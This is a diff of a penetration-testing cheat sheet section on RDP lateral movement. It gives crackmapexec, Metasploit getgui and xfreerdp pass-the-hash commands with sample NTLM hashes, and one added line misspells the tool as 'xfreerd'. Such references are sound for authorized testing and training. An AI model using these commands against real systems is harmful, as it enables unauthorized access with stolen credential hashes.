@@ -119,17 +119,19 @@ or with crackmapexec
 crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
 ```
 
-For Server 2012 R2, Win8.1+
-
-```powershell
-xfreerdp /u:offsec /d:win2012 /pth:88a405e17c0aa5debbc9b5679753939d /v:192.168.1.12
-```
-
-with Metasploit
+or with Metasploit
 
 ```powershell
 run getgui -u admin -p 1234
 ```
+
+Then log in using xfreerdp 
+
+```powershell
+xfreerdp /u:offsec /d:win2012 /pth:88a405e17c0aa5debbc9b5679753939d /v:10.0.0.1 # pass the hash works for Server 2012 R2 / Win 8.1+
+ xfreerd /u:runner /v:10.0.0.1 # password will be asked
+```
+
 
 ## Netuse (Windows)
 
